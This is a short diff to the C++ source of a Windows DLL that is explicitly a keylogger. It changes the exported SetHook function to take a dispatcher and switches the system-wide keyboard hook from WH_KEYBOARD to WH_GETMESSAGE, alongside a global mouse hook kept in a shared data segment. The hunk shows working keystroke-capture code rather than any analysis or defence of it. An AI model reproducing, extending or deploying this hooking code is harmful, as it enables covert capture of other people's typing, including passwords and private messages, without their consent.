@@ -1,7 +1,7 @@
 #include <iostream>
 #include <string>
-#include <Windows.h>
 #include "Keylogger.hpp"
+#include <Windows.h>
 
 #pragma data_seg("Shared")
 HHOOK g_hook[2] = { NULL, NULL };
@@ -18,10 +18,11 @@ LRESULT __declspec(dllexport)__stdcall CALLBACK KeyboardProc(int code, WPARAM wP
 	return CallNextHookEx(NULL, code, wParam, lParam);
 }
 
-extern "C" __declspec(dllexport) void SetHook()
+extern "C" __declspec(dllexport) void SetHook(Dispatcher *disp)
 {
+	Keylogger::setDispatcher(disp);
 	if (g_hook[0] == NULL)
-		g_hook[0] = SetWindowsHookEx(WH_KEYBOARD, Keylogger::handleKey, g_hInst, 0);
+		g_hook[0] = SetWindowsHookEx(WH_GETMESSAGE, Keylogger::handleKey, g_hInst, 0);
 	if (g_hook[1] == NULL)
 		g_hook[1] = SetWindowsHookEx(WH_MOUSE, Keylogger::handleMouse, g_hInst, 0);
 }
